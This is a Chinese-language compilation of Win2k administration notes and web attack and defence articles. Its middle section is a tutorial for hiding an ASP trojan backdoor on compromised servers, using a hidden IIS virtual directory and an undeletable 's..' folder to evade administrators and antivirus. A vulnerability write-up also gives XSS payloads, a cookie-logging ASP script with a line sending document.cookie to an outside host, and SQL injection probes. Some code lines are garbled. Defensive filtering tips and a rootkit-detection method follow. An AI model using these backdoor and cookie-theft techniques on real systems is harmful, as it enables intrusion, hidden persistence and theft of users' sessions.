3) 进入命令提示符为% S y s t e m R o o t %的目录下，通常是C : \ W I N N T。
现在你可以输入故障恢控制台命令，执行修复任务了。
警告因为你登录的是故障恢复控制台，所以如果安全帐户管理器（SAM）崩溃或丢失了，
则不能使用这个特性。
5.5.2 故障恢复控制台命令
在故障恢复控制台中可使用如下命令：
CD/CHDIR
CHKDSK
CLS
COPY
DEL/DELETE
DIR
DISABLE
ENABLE
DISKPART
FIXBOOT
FIXMBR
formAT
LISTSVC
LOGON
MAP
MD/MKDIR
MORE
RD
REN/RENAME
RMDIR
SYSTEMROOT
TYPE
ATTRIB
EXTRACT
这里的大多数命令是常用的M S - D O S命令，有一些你可能不熟悉（输入H e l p / c o m m a n d可了
解有关命令的信息）。使用这些命令可能比较危险，所以计算机新手不要使用故障恢复控制台。
键入E X I T可离开故障恢复控制台，并重新启动计算机。
5.5.3 故障恢复控制台的限制
当你在故障恢复控制台中工作时受到以下限制的制约：
. 你只能访问和查看在开始的屏幕上选择安装Windows 2000的% S y s t e m R o o t %目录（和子目
录）（通常是C : \ W I N N T）。如果你试图查看另一个% S y s t e m R o o t %目录，会看到一个“拒
绝访问”的错误。
. 可以将文件从软盘复制到硬盘。
. 可以在硬盘上将文件从一个位置复制到另一个位置。
. 不能将本地硬盘上的文件复制到软盘上。
5.5.4 安装故障恢复控制台
你可以安装故障恢复控制台，这样当你想加强配置设置和驱动程序（或需要时执行修复）
时，就可以随时使用它了。
安装是用Wi n n t 3 2命令实现的，它在Windows 2000 CD-ROM的\ i 3 8 6文件夹中。输入下面的
命令安装故障恢复控制台。
在这里：X是Windows 2000 CD-ROM的驱动器盘符或Windows 2000安装文件所在的网络共
享的映射驱动器符。f o l d e r n a m e是\ a l p h a或\ i 3 8 6。
安装程序对话框显示了一个将故障恢复控制台作为一个启动选项安装的确认，单击“是”
继续，一个安装向导会负责必要文件的自动安装。你必须重新启动计算机来完成安装。
当操作系统引导时，一个新的选项“ Microsoft Windows 2000命令控制台”出现在菜单中，
它在b o o t . i n i中的项目是：
C : \ C M D C O N S \ B O O T S E C T . D A T = ”Microsoft Windows 2000 命令控制台” / c m d c o n s
5.5.5 卸载故障恢复控制台
你可以按照下面的步骤删除故障恢复控制台和它的菜单项：
1) 编辑b o o t . i n i，删除故障恢复控制台所在的行。
2) 在引导分区的根目录中删除C : \ C m d c o n s目录。
3) 在引导分区的根目录中删除名为Cm l d r的文件。
如果有多个用户要访问一台计算机，而且只要他们中有一个用户属于管理员所担心的“知
道的东西多得足以造成危险”的那类人，那么卸载故障恢复控制台是很有意义的。
win2k进程详解
win2k运行进程详解 
Svchost.exe 
Svchost.exe文件对那些从动态连接库中运行的服务来说是一个普通的主机进程名。Svhost.exe文件定位 
在系统的%systemroot%\system32文件夹下。在启动的时候，Svchost.exe检查注册表中的位置来构建需要 
加载的服务列表。这就会使多个Svchost.exe在同一时间运行。每个Svchost.exe的回话期间都包含一组服务， 
以至于单独的服务必须依靠Svchost.exe怎样和在那里启动。这样就更加容易控制和查找错误。 
Svchost.exe 组是用下面的注册表值来识别。 
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Svchost 
每个在这个键下的值代表一个独立的Svchost组，并且当你正在看活动的进程时，它显示作为一个单独的 
例子。每个键值都是REG_MULTI_SZ类型的值而且包括运行在Svchost组内的服务。每个Svchost组都包含一个 
或多个从注册表值中选取的服务名，这个服务的参数值包含了一个ServiceDLL值。 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Service 
更多的信息 
为了能看到正在运行在Svchost列表中的服务。 
开始－运行－敲入cmd 
然后在敲入 tlist -s （tlist 应该是win2k工具箱里的冬冬） 
Tlist 显示一个活动进程的列表。开关 -s 显示在每个进程中的活动服务列表。如果想知道更多的关于 
进程的信息，可以敲 tlist pid。 
Tlist 显示Svchost.exe运行的两个例子。 
0 System Process 
8 System 
132 smss.exe 
160 csrss.exe title: 
180 winlogon.exe title: NetDDE Agent 
208services.exe 
Svcs: AppMgmt, Browser, Dhcp, dmserver, Dnscache, Eventlog, lanmanserver, LanmanWorkstation, LmHosts, Messenger, PlugPlay, ProtectedStorage, seclogon, TrkWks, W32Time, Wmi 
220 lsass.exe Svcs: Netlogon,PolicyAgent,SamSs 
404 svchost.exe Svcs: RpcSs 
452 spoolsv.exe Svcs: Spooler 
544 cisvc.exe Svcs: cisvc 
556 svchost.exe Svcs: EventSystem,Netman,NtmsSvc,RasMan,SENS,TapiSrv 
580 regsvc.exe Svcs: RemoteRegistry 
596 mstask.exe Svcs: Schedule 
660 snmp.exe Svcs: SNMP 
728 winmgmt.exe Svcs: WinMgmt 
852 cidaemon.exe title: OleMainThreadWndName 
812 explorer.exe title: Program Manager 
1032 OSA.EXE title: Reminder 
1300 cmd.exe title: D:\WINNT5\System32\cmd.exe - tlist -s 
1080 MAPISP32.EXE title: WMS Idle 
1264 rundll32.exe title: 
1000 mmc.exe title: Device Manager 
1144 tlist.exe 
在这个例子中注册表设置了两个组。 
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Svchost: 
netsvcs: Reg_Multi_SZ: EventSystem Ias Iprip Irmon Netman Nwsapagent Rasauto Rasman Remoteaccess SENS Sharedaccess Tapisrv Ntmssvc 
rpcss :Reg_Multi_SZ: RpcSs 
smss.exe 
csrss.exe 
这个是用户模式Win32子系统的一部分。csrss代表客户/服务器运行子系统而且是一个基本的子系统 
必须一直运行。csrss 负责控制windows，创建或者删除线程和一些16位的虚拟MS-DOS环境。 
explorer.exe 
这是一个用户的shell（我实在是不知道怎么翻译shell），在我们看起来就像任务条，桌面等等。这个 
进程并不是像你想象的那样是作为一个重要的进程运行在windows中，你可以从任务管理器中停掉它，或者重新启动。 
通常不会对系统产生什么负面影响。 
internat.exe 
这个进程是可以从任务管理器中关掉的。 
internat.exe在启动的时候开始运行。它加载由用户指定的不同的输入点。输入点是从注册表的这个位置 
HKEY_USERS\.DEFAULT\Keyboard Layout\Preload 加载内容的。 
internat.exe 加载“EN”图标进入系统的图标区，允许使用者可以很容易的转换不同的输入点。 
当进程停掉的时候，图标就会消失，但是输入点仍然可以通过控制面板来改变。 
lsass.exe 
这个进程是不可以从任务管理器中关掉的。 
这是一个本地的安全授权服务，并且它会为使用winlogon服务的授权用户生成一个进程。这个进程是 
通过使用授权的包，例如默认的msgina.dll来执行的。如果授权是成功的，lsass就会产生用户的进入 
令牌，令牌别使用启动初始的shell。其他的由用户初始化的进程会继承这个令牌的。 
mstask.exe 
这个进程是不可以从任务管理器中关掉的。 
这是一个任务调度服务，负责用户事先决定在某一时间运行的任务的运行。 
smss.exe 
这个进程是不可以从任务管理器中关掉的。 
这是一个会话管理子系统，负责启动用户会话。这个进程是通过系统进程初始化的并且对许多活动的， 
包括已经正在运行的Winlogon，Win32（Csrss.exe）线程和设定的系统变量作出反映。在它启动这些 
进程后，它等待Winlogon或者Csrss结束。如果这些过程时正常的，系统就关掉了。如果发生了什么 
不可预料的事情，smss.exe就会让系统停止响应（就是挂起）。 
spoolsv.exe 
这个进程是不可以从任务管理器中关掉的。 
缓冲（spooler）服务是管理缓冲池中的打印和传真作业。 
service.exe 
这个进程是不可以从任务管理器中关掉的。 
大多数的系统核心模式进程是作为系统进程在运行。 
System Idle Process 
这个进程是不可以从任务管理器中关掉的。 
这个进程是作为单线程运行在每个处理器上，并在系统不处理其他线程的时候分派处理器的时间。 
taskmagr.exe 
这个进程是可以在任务管理器中关掉的。 
这个进程就是任务管理器。 
winlogon.exe 
这个进程是管理用户登录和推出的。而且winlogon在用户按下CTRL+ALT+DEL时就激活了，显示安全对话框。 
winmgmt.exe 
winmgmt是win2000客户端管理的核心组件。当客户端应用程序连接或当管理程序需要他本身的服务时这个进程初始化。









五：功防技术大全
MSSQL数据库注射的一些技巧
大伙是不是在注射时在ACCESS中用 asc(mid(字段,1,1))>0之类的函数用起来很顺手了呢。 
可是一碰到MSSQL数据库以上方法就失效了。这是因为处理的函数不一样造成的。
把asc改为ascii
把mid改为 substring
即 ascii(substring(字段,1,1))>0这样就能正常的对其进行注射查询了。
left,right的用法和access中一样
建造永不被杀的80端口后门
参考LCX在X档案发表过永远不被杀的的后门，自己就实验起来,只要把ASP木马放到其中一个站点中某个深的目录中，再在Internet 服务管理器面中选着这个站点（比如默认管理站点）打开修改属性->主目录中，把“应用程序保护”中改为"低"，再在"写入""前面打上钩，在浏览器中输入ASP木马路径，输入密码以后进入管理页面，运行CMD命令还可以加用户之类的果然是管理员权限，呵呵用后发觉还不错，自觉以为就不错，而且上传文件都是在WEB进程上来着，而且还有系统权限，还觉得这样建立肉鸡相对来说比较安全就走了，后来想不到不过几天这个后门过几就没了，浏览上去什么都连ASP木马都没了，到底怎么回事？而且对方还搞了防火墙，只开21，80端口，眼汪汪丢去真可惜，看来管理员是察觉到了。看着我想有两个可能，一是ASP木马被杀，被管理员查到ASP木马就删了，二是那个可能管理员看到这个站点的属性改了就XXX~~~~，你也许会说用站点属性修改过的可以“写入”来写个木马上去，可是错了，管理员把默认管理站点都删了，或者者做其他修改了，昏，本来好好的后门却成了比较明显的暴露给管理员看了，而且最新的ASP也被会杀毒，看来个ASP看来这种方法也是不太隐蔽，还需要改进，突然想到可以通过后来参考建立隐藏主页，而且是虚拟目录可以设置“应用程序保护”为低的，其他站点中的目录属性是不可以设置这样的属性的，这样就不会暴露Internet 服务管理器中任何修改的迹象了，（对于一般的管理员来说，对于BT的我就不敢说了），OK我们来第一步 
建立个隐藏虚拟主页（同时也可以做主页一举两得）
一般情况下，如果在肉鸡上开主页的话，只要管理员查看一下iis管理器程序，就会发现我们的主页，这样不但我们的主页暴露了，还可能会被管理员把我们给踢出去。而今天我教大家的方法是让管理员在iis管理器里发现不了方法。首先打开肉机（本例中以自己的机器为例）iis管理器，选定一个文件夹，然后点击右键，选择“资源管理器”，到网站的根目录下新建一个文件夹kiss，然后到system32上新建一个文件夹，我这里取名为myhome（这个文件夹尽量隐蔽的目录深一些，才不会被管理员发现），回到iis管理器按f5刷新就会看到kiss这个目录，选中它后，点击右键，选择“新建>虚拟目录”，我们给主个虚拟目录取名kiss，然后把这个虚拟目录指向myhome，建立完成后，现在放个首页进去，打开浏览器，输入
http://127.0.0.1/kiss/kiss就应该可?..性先，修改属性->主目录中，把“应用程序保护”中改为"低"，再在"写入""前面打上钩，在浏览器中输入ASP木马路径，输入密码以后进入管理页面，运行CMD命令还可以加用户之类的果然是管理员权限，这样做就是把ASP放到system32/myhome目录下，比如你ASP木马是kiss.asp,那么放到
system32/myhome目录后，浏http://127.0.0.1/kiss/kiss/kiss.asp 就是你asp木马的路径了，让这样kiss这个目录没有了。然后打开我的电脑，找到网站的根目录，删掉kiss这个文件夹，再打开浏览器输入刚才的网址，哈哈，是不是又打开了，怎么样，一个隐藏的个人主页就这样建立完成了。这样就不再会被管理员发现了吧，你不信就把iis的管理器关了，再进入果然是没有修改的痕迹，这样也可以建立网页，如果你说这样会增加你的主页危险性，那你就重新建立个虚拟目录，不用我说了吧，再者如果再想修改你的虚拟目录的属性的话可以再在网站的根目录重新建立kiss目录，然后在iis的管理器就可以看到你的站点了
二让ASP木马不被杀
你要说是修改ASP木马其中代码或者加密等来逃避杀毒，错了，这个不用你修改，而且谁也不保证你修改过的ASP不被XX杀毒软件杀，反正我也是懒改，呵呵，我们运行CMD，cd c:\winnt\system32\myhome下也。也就是你虚拟目录转向的地址，先说一下原理大家都知道在Windows中“\”符号是路径的分隔符号，比如“C:\Windows\”的意思就是C分区中的Windows文件夹，“C:\Windows\System.exe”的意思就是C分区中的Windows文件夹中的System.exe文件，好继续我们假设一下：
如果文件名中有“\”符号会怎么样呢？假如“S\”是一个文件夹的名字，这个文件夹位于：“F:\”，他的路径就是“F:\S\”，当我们试图访问的时候Windows会错误的认为我们要打开的文件是C分区的S文件夹，这样Windows就无法打开并且会返回一个错误，因为以上的路径并不存在。
也许你现在正在尝试创建“S\”文件，但是Windows会提示你：“\”符号是不能作为文件、文件夹的名字的。看来Windows还是早已想到这一点了的。OK我们继续进行，就不信不能建立包含“\”符号的文件。
现在打开你的电脑，我们要做一些很有趣的尝试。进入Windows后 点击：开始>运行 然后输入“cmd”并会车（如果是Win98请输入“COMMAND”），这时你会看到Windows的命令控制台，我们就是要利用它完成我们剩下的测试，以下包含了很多命令其中{}中的字符是我的注释：
Microsoft Windows XP [版本 5.1.2600]
(C) 版权所有 1985-2001 Microsoft Corp.
c:\winnt\system32\myhome>mkdir s\ {我们的第一次尝试,结果Windows只创建了S文件夹"\"被忽略掉了}
c:\winnt\system32\myhome>mkdir s\s1\ {还是失败,Windows先创建了S文件夹，然后在S内创建s1文件夹}
c:\winnt\system32\myhome>mkdir s.\ {"s.\"被解析成S".\"又被忽略了}
子目录或文件 s.\ 已经存在。 
c:\winnt\system32\myhome>mkdir s..\ {终于成功了,现在你可以在资源管理器看到"s."但却无法打开/删除}
c:\winnt\system32\myhome>mkdir s...\ {又成功了,在资源浏览器能吹?s.."可以打开但是无法删除}
----------------------------------------------
为什么会这样？我们先说你看到的这个“S.”文件夹，他即不能打开也不能删除，不能打开是因为他的实际路径是“c:\winnt\system32\myhome\s..\”（我们自己创建的所以可以确定他的实际路径）但是在Windows资源管理器中名字变成了“S.”也就是说当你试图打开它的时候Windows实际上尝试打开“c:\winnt\system32\myhome\s.\”当然是不能打开的，文件并不存在，所以Windows会报错。不能删除也是因为这个，Windows把一个实际存在的文件路径错误的解析为一个不存在的路径，并进行xx作当然是无法完成的。
该说“S..”这个文件了，这个文件可以打开，但是却无法删除。等等……打开？你以为Windows真的是打开了我们创建的“s...\”文件了吗？我们做下面的试验你就明白了。还是老规矩{}是我的注释方便大家理解：
----------------------------------------------
Microsoft Windows XP [版本 5.1.2600]
(C) 版权所有 1985-2001 Microsoft Corp.
c:\winnt\system32\myhome>copy net.asp s..\ {复制刚刚你的asp的木马文件到“s..\”，资源管理器的“S.”}
已复制 1 个文件。
c:\winnt\system32\myhome>
----------------------------------------------
现在回到你的资源管理器打开“S.”文件夹，你看到了什么？“net.asp”文件怎么会在这里？我们刚刚的确复制到了“S.”呀？难道我们打开“S.”文件夹实际上就是打开了“S”？不错事实就是这样。其实如果你再创建一个“S”文件夹的话“S.”就能打开了，但是实际上打开的是“S”。
这是关键的话题了，其实我们就利用S.目录不被杀的目的来隐藏我们的木马，不管木马都毒，可是一般来说的exe文件不能在s.这样的目录下运行的，但是asp木马却可以！可以通过浏览来执行CMD命令，把net.asp复制到s.目录后，把net.asp删了，我们在浏览器http://127.0.0.1/kiss/kiss/s../net.asp 就可以看到浏览得asp木马了到了，一般用户根本不可能发现他，就算专业级的杀毒软件也只会去杀“s”而跳过“s..\”，好了那就说一下删除方法吧
Microsoft Windows XP [版本 5.1.2600]
(C) 版权所有 1985-2001 Microsoft Corp.
F:\Test>dir
驱动器 F 中的卷是 BGTING
卷的序列号是 2C8E-FE1C
F:\Test 的目录
2003-09-11 17:50 <DIR> .
2003-09-11 17:50 <DIR> ..
2003-09-11 18:35 <DIR> s.
2003-09-11 18:37 <DIR> s..
1 个文件 9 字节
5 个目录 3,390,029,824 可用字节
c:\winnt\system32\myhome>rmdir s..\
目录不是空的。
c:\winnt\system32\myhome>rmdir s..\ /s
s..\, 是否确认(Y/N)? y
c:\winnt\system32\myhome>rmdir s...\ /s
s...\, 是否确认(Y/N)? y
这也不用担心搞坏你肉鸡了，好了这样一个很隐蔽的后门就建立了，而且不被杀，如果在肉鸡，上述要在3389进行测试通过的。
约稿奇兵存在大量漏洞
描述： 
　　约稿骑兵是由劲风独立开发与维护的一个集作者投稿、编辑审稿、稿费管理等诸多有创意的功能为一体的ASP程序。由于大量文件没有对提交的表单进行字符过滤。导致非法用户可提交精心构造的语句执行跨站脚本，致使浏览者中木马、信息泄露、重则格式化硬盘。其二，由于view_pf.asp文件没有过滤用户提交传递给SQL查询的输入，导致远程攻击者可以利用这个漏洞进行SQL Injection攻击，获取任意用户的密码。
　　ASP版的约稿骑兵劲风已经停止开发了，取而代之的是用ASP.NET开发的约稿通，预计将在2004年7月份发布，大家拭目以待吧，相信劲风能给我们带来更大的惊喜。
检测过程： 
一、跨站脚本攻击
　　 既然是瞎子摸象式的测试这个未公开的约稿骑兵，说明会有蛮多这样那样的漏洞。比如：脚本问题，最简单的，用“'”和“;”以及“>”作为用户名注册，系统并没有提示禁止提交非法字符，于是用“<script>alert();</script>”为用户名注册。可惜，单表域限制了字符数量，这样就可以限制字符长度了？呵呵，但愿没有禁止从外部提交数据。于是做一个注册页，将form action指向该站点注册页，果然注册成功，提交的时侯发现，该站点有两种会员可以注册，一种是直接注册的（作者），一种是注册后要管理员验证才可以使用的（编辑），刚才注册的只是个作者，这次注册编辑看看。仍然按刚才的方法，注册了会员<script>alert('1');</script>提交到最后，系统给出了提示：您已经注册成功。而空过两行后又出现，您注册的用户名里含有'<等非法字符，请重新注册。这里又是程序上的一个BUG，过滤没有完全实现，先不管那么多，进入看看里面的东西如何。 
　　进入后，先到会员列表查看会员，果然弹出对话框两个，想要的效果实现了，这样跨站攻击就可以实现了。进入修改自己的资料中，里面各种资料要填写的很多。于是......尝试了一下真实地址栏里填写“<script>alert();</script>”确认。再查看地址，又有对话框了，这就成了，不用想了，整个站点这个问题根本没有解决好。 
　　在前面我们已经说过，还有编辑注册后是需要管理人员认证才可能通过验证的。这就...嘿嘿...于是注册用户名test，呵呵，为什么不直接取？不能叫管理员怀疑嘛，叫他进去后再后悔.在注册会员资料里好好的构造了一番。地址栏取COOKIES转载打印到其他站点的某个文本文件（这里就不多说了）：取COOKIES原码如下： 
<% 
testfile=Server.MapPath("fqytest.txt") 
msg=Request("msg") 
set fs=server.CreateObject("scripting.filesystemobject") 
set thisfile=fs.OpenTextFile(testfile,8,True,0) 
thisfile.WriteLine(""&msg& "") 
thisfile.close 
set fs = nothing 
%> 
<script>window.locationhttp://www.e3i5.com');</script> 
　　 将以上代码保存为ASP文件就可以了，然后填入以下代码就可以开始收集Cookie啦。 
<img src="javascript:window.openhttp://youromain/cookie.php?'+documents.cookie)"> 
　　 至于如何令浏览用户被格式化。大家还是去看看相关的文章吧。还是利用javascript。由于危害太大。代码不省略了…… 
二、SQL Injection攻击 
　　 除了上面所说的跨站脚本攻击外。就是这个SQL Injection漏洞了。手工检测。发现这个漏洞存在于xuanti_xiugai1.asp（选题查询）、view_pf.asp（会员查询）两个文件，看来检查了提交的字符中是否有单引号和分号。检查的过程可能有些不同。但还是差不多的。尽管过滤了两个那特殊字符。但系统是access数据库的，仅过滤这两个字符根本不能拦住攻击者。因为这两个文件没有过滤空格，我们照样玩SQL Injection。提交： 
xuanti_xiugai1.asp?xuan_id=56 and 1=1 
//正常显示 
xuanti_xiugai1.asp?xuan_id=56 and 1=2 
//警告：你正在企图非法浏览别人的选题 
view_pf.asp?id=74 and 1=1 
//正常显示 
view_pf.asp?id=74 and 1=2 
//资料全部显示空 
　　 好了。知道该做什么了吗？跨表查询。这可是access数据库最常用的SQL Injection攻击方法了。关于详细的攻击方法，大家可以参考PsKey的《SQL Injection whit access》和我的《一个跨表查询的例子》都很详细。我们此次任务是检测程序的安全性。目的已经达到了。 
　　 感谢风清扬的参与。 
解决方案：
　　关于这个约稿骑兵的防范方法也和许多程序一样。都是很普遍的问题——过滤字符。 
　　第一个问题就是跨站脚本攻击，由于没有进行脚本过滤。导致可以构造特殊html代码进行攻击，所以我们应该加上过滤的代码来过滤：HTMLEncode(加你的引用函数名) 如： 
　　HTMLEncode(&username) 就可以简单的屏蔽脚本攻击了。另外，对于跨站和外部提交的问题，对提交文件如post.asp，reg.asp等等文件加一个检验就可以了。 
代码如下： 
if instr(request.servervariables("http_referer"),"e3i5")<1 then 
response.redirect "index.asp" 
end if 
'e3i5 为你所用站点的域名私有部分.当然也可以使用地址连接里有的的字符串，都可以用. 
'或 
if instr(request.servervariables("http_referer"),"http://"&request.servervariables("host") )<1 then 
response.redirect "index.asp" 
end if 
　　另外，可以参考一下动网的char.asp文件。 
　　第二个问题就是SQL Injection攻击，有人认为SQL Injection攻击千变万化。难以防范。况且现在牛人这么多。其实再怎么灵活的技术，只要对用户提交的变量进行了完整的过滤，都不可能有问题。至于防范方法嘛方法太多了。给出一段我一直用的代码： 
dim id 
id=replace(request("id")," ","") 
if isnumeric(id)=0 or id="" then 
response.write "禁止提交非法语句！" 
response.end 
end if 
　　 放在文件前面就可以检查提交的变量id了。方法实在太多，所以我就不说了。从理论上来说，对用户提交的变量。只能是字母和数字。所以程序要尽可能多过滤一些非法字符。单引号、双引号、分号、空格、<、>等。 
这次检测也结束了，程序不可能很完美，我的水平也有限。直觉上这个程序的BUG应该还有。如果能把刚才所发现的漏洞修补好。在瞎子摸象的情况下。已经是相当难更深入了。因为至始至终我们都没有得看到程序源代码和数据库的结构。
常见的 ASP脚本攻击及防范技巧
由于ASP的方便易用，越来越多的网站后台程序都使用ASP脚本语言。但是， 由于ASP本身存在一些安全漏洞，稍不小心就会给黑客提供可乘之机。事实上，安全不仅是网管的事，编程人员也必须在某些安全细节上注意，养成良好的安全习惯，否则会给自己的网站带来巨大的安全隐患。目前，大多数网站上的ASP程序有这样那样的安全漏洞，但如果编写程序的时候注意一点的话，还是可以避免的。 
　1、用户名与口令被破解
　攻击原理：用户名与口令，往往是黑客们最感兴趣的东西，如果被通过某种方式看到源代码，后果是严重的。
　防范技巧：涉及用户名与口令的程序最好封装在服务器端，尽量少在ASP文件里出现，涉及与数据库连接的用户名与口令应给予最小的权限。出现次数多的用户名与口令可以写在一个位置比较隐蔽的包含文件中。如果涉及与数据库连接，在理想状态下只给它以执行存储过程的权限，千万不要直接给予该用户修改、插入、删除记录的权限。
　2、验证被绕过
　攻击原理：现在需要经过验证的ASP程序大多是在页面头部加一个判断语句，但这还不够，有可能被黑客绕过验证直接进入。
　防范技巧：需要经过验证的ASP页面，可跟踪上一个页面的文件名，只有从上一页面转进来的会话才能读取这个页面。
3、inc文件泄露问题
　攻击原理：当存在ASP的主页正在制作且没有进行最后调试完成以前，可以被某些搜索引擎机动追加为搜索对象。如果这时候有人利用搜索引擎对这些网页进行查找，会得到有关文件的定位，并能在浏览器中查看到数据库地点和结构的细节，并以此揭示完整的源代码。
　防范技巧：程序员应该在网页发布前对它进行彻底的调试；安全专家则需要加固ASP文件以便外部的用户不能看到它们。首先对.inc文件内容进行加密，其次也可以使用.asp文件代替.inc文件使用户无法从浏览器直接观看文件的源代码。inc文件的文件名不要使用系统默认的或者有特殊含义容易被用户猜测到的名称，尽量使用无规则的英文字母。
　4、自动备份被下载
　攻击原理：在有些编辑ASP程序的工具中，当创建或者修改一个ASP文件时，编辑器自动创建一个备份文件，比如：UltraEdit就会备份一个.bak文件，如你创建或者修改了some.asp，编辑器会自动生成一个叫some.asp.bak文件，如果你没有删除这个bak文件，攻击者可以直接下载some.asp.bak文件，这样some.asp的源程序就会被下载。
　防范技巧：上传程序之前要仔细检查，删除不必要的文档。对以BAK为后缀的文件要特别小心。
　5、特殊字符
　攻击原理：输入框是黑客利用的一个目标，他们可以通过输入脚本语言等对用户客户端造成损坏；如果该输入框涉及数据查询，他们会利用特殊查询语句，得到更多的数据库数据，甚至表的全部。因此必须对输入框进行过滤。但如果为了提高效率仅在客户端进行输入合法性检查，仍有可能被绕过。
　防范技巧：在处理类似留言板、BBS等输入框的ASP程序中，最好屏蔽掉HTML、javascript、VBScript语句，如无特殊要求，可以限定只允许输入字母与数字，屏蔽掉特殊字符。同时对输入字符的长度进行限制。而且不但要在客户端进行输入合法性检查，同时要在服务器端程序中进行类似检查。

6、数据库下载漏洞
　攻击原理：在用Access做后台数据库时，如果有人通过各种方法知道或者猜到了服务器的Access数据库的路径和数据库名称，那么他也能够下载这个Access数据库文件，这是非常危险的。
　防范技巧：
　（1）为你的数据库文件名称起个复杂的非常规的名字，并把它放在几层目录下。所谓 “非常规”， 打个比方说，比如有个数据库要保存的是有关书籍的信息， 可不要给它起个“book.mdb”的名字，而要起个怪怪的名称，比如d34ksfslf.mdb， 并把它放在如./kdslf/i44/studi/的几层目录下，这样黑客要想通过猜的方式得到你的Access数据库文件就难上加难了。
　（2）不要把数据库名写在程序中。有些人喜欢把DSN写在程序中，比如： 
　　DBPath = Server.MapPath（“cmddb.mdb”）
　　conn.Open “driver={Microsoft Access Driver （*.mdb）}；dbq=” & DBPath 
　假如万一给人拿到了源程序，你的Access数据库的名字就一览无余了。因此建议你在ODBC里设置数据源，再在程序中这样写：
　　conn.open“shujiyuan”
　（3）使用Access来为数据库文件编码及加密。首先在“工具→安全→加密/解密数据库”中选取数据库（如：employer.mdb），然后按确定，接着会出现“数据库加密后另存为”的窗口，可存为：“employer1.mdb”。
　要注意的是，以上的动作并不是对数据库设置密码，而只是对数据库文件加以编码，目的是为了防止他人使用别的工具来查看数据库文件的内容。
　接下来我们为数据库加密，首先打开经过编码了的 employer1.mdb，在打开时，选择“独占”方式。然后选取功能表的“工具→安全→设置数据库密码”，接着输入密码即可。这样即使他人得到了employer1.mdb文件，没有密码他也是无法看到 employer1.mdb中的内容。
高级WIN2K ROOTKIT检测技术
摘要:本文描述了一种检测内核与用户级rootkit的新技术.此技术利用处理器的单步执行模式,来测定系统内核与DLL中执行指令的数量,从而达到检测rootkit和后门的目的.同时还讨论了其在Win2k下的代码实现.
--背景知识
一个在计算机安全领域中重要的问题是,如何判断给定的主机是否已被入侵.由于以下两点这项工作变的非常困难:
1.攻击者可以利用未知漏洞进入系统.
2.当进入系统后,入侵者可通过安装rootkit和后门来隐藏自身(例如:隐藏进程,通讯渠道,文件等).本文将集中讨论在Win2K系统下rootkit的检测问题.
--传统rootkit检测技术中的一些问题
传统的rootkit检测程序(那些我们经常在UNIX系统中见到的)只能检测一些已知的rootkit(这点使它变的像反病毒程序)或进行一些内核存储的扫描.例如Linux中就有一些工具扫描内核中的syscall table.这显然不够好,因为已经有了很多并不更改syscall table的rootkit,而Win2k下也可开发出类似的rootkit.
那检测程序是不是还应该扫描内核代码空间?这样我们就有了一个运行在内核模式中的Tripwire.但这还不够好,因为在大多数的操作系统中,我们可以写出即不更改SST(syscall table)也不更改代码的内核级rootkit.在系统中有很多可以勾连的函数指针(例见[2]).
以我看,存储扫描技术决不会成为rootkit检测的终结.这主要是因为我们不能确定具体的监测存储区域.
那到底怎样检测出我们系统中的入侵者呢?
首先我们以rootkit中所使用的技术,将其分为两类:
*通过更改系统结构来隐藏某对象的(如运行的进程)和
*更改内核执行路径(例:勾连那些负责枚举活动进程的内核函数)来达到同样目的的.
--更改系统数据结构的rootkit
这类的rootkit不太多.有意思的例子包括fu rootkit(见[3]),通过删除内核中PsActiveProcessList链上的进程对象来隐藏进程.ZwQuerySystemInformation等函数是不能发现这些隐藏进程的.但同时,因为Windows的线程分派器(dispatcher, scheduler)使用另外的数据结构,这些"隐藏"进程仍可运行(被分配到CPU使用时间).Windows的线程分派器使用以下三个(注1)数据结构:
*pKiDispatcherReadyListHead
*pKiWaitInListHead
*pKiWaitOutListHead
后两个是处于"等待"状态的线程链头.他们之间稍有不同,但对我们来说并不重要.
从上面的信息我们可以找到一种检测隐藏进程的方法.及读取线程分派器使用的数据结构,而不是PsActiveProcessList.
当检测rootkit时我们应该尽可能的触及更底层的内核数据结构.
有一点应该注意,直接从线程分派器使用的链中删除要隐藏的进程是不可能的,因为隐藏的进程将分配不到CPU使用时间.
--更改执行路径的rootkit
这类的rootkit较为普及.他们通过修改或增加内核或系统DLL中的指令来达到目的.检测这类rootkit的问题是,我们不知道rootkit在什么地方做了那些修改.它可以勾连DLL中的函数,系统服务列表(System Service Table),改变内核函数的内容或修改内核中一些奇怪的函数指针.
--执行路径分析(Execution Path Analysis)
EPA关注这样一个事实:如果入侵者通过修改执行路径隐藏了一些对象,那么当调用一些典型的系统和库的函数时,系统将运行一些多余的指令.
举个例子,如果入侵者为了隐藏文件和进程而修改了ZwQueryDirectoryFile()和ZwQuerySysteminformation(),那样和干净的系统相比,这些系统函数就会执行更多的指令.不管入侵者采用勾连或在代码中加入jmp指令,或其他任何方法.指令增加的原因是rootkit必须进行它的任务(在这个例子中是隐藏文件和进程).
但是Windows 2000的内核是一个非常复杂的程序,即使在干净的系统中,某些系统函数每次运行的指令个数也是不同的.然而我们可以用统计学来解决这个问题.但首先,我们需要一种测定指令个数的方法......
--指令计数器的实现
单步执行模式是Intel处理器的一个好的特性,我们可以用它来实现指令计数.当处理器处在这个模式时,每执行完一条指令,系统将产生一个除错异常(debug exception, #DB).要进入这个模式,需要设置EFLAGS寄存器中的TF位(详见[6]).
当执行int指令时,处理器会自动清TF位并进行权限切换.这意味着,如果要进行内核模式下的指令计数,则必须在中断处理程序开头设置TF位.因为我们将要测定一些系统服务中的指令个数,勾连中断向量0x2e,也就是Windows 2000下的系统服务调用门会变得很有效.
但是,因为存在用户模式的rootkit,也应该测定在ring3级运行的指令个数.只要在用户模式下设置TF位一次就可以了,从内核返回时,处理器会自动恢复这一位.
以上的计数方法通过内核驱动器实现.如图2所示,驱动加载后勾连IDT 0x1和0x2e.为和用户级程序交互.驱动勾连一个系统调用,用户级程序通过这个特定的系统调用来开关计数器.
--一些测试
我们可以使用上一段中描述的方法来测定任意系统服务中执行的指令个数.
例如,来检查是否有人试图隐藏任意文件,我们可以开始一个简单的测试:
pfStart();
FindFirstFile("C:\\WINNT\\system32\\drivers", &FindFileData);
int res = pfStop();
如果有rootkit隐藏任意文件,则执行的指令数要比干净的系统多.
